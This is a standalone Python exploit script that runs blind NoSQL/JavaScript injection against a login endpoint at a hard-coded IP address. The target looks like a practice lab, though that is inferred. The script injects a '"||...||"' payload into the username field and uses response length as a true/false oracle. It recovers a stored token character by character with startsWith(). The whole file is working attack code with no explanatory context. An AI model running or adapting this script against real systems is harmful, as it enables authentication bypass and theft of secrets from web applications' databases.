#! /usr/bin/env python3

import json
import requests
import string
from urllib.parse import quote_plus
import re

# Configuration
URL = "http://94.237.53.81:32333/login"
PROXY = {"http":"http://172.21.144.1:8081"}
HEADERS = {"Content-Type":"application/x-www-form-urlencoded"}
CHARSET = string.ascii_letters + string.digits + string.punctuation + " "

def oracle(t):
    r = requests.post(URL, headers=HEADERS, proxies=PROXY, data={'username': '"||' + t + '||"', 'password': 'test'})
    # print(len(r.content))
    return len(r.content) == 2191

# username = "$2y$10$VdRHBCzi1DzgzAtPDCDG.O6bnaLj1cd5HBQHmGJHjw982AIJugWby"
username = ""
for _ in range(200):
    found_char = False
    for c in CHARSET:
        if oracle(f"this.token.startsWith({json.dumps(username + c)})"):
            username += c
            print(username)
            found_char = True
            break
    if not found_char:
        break
print("Final username:", username)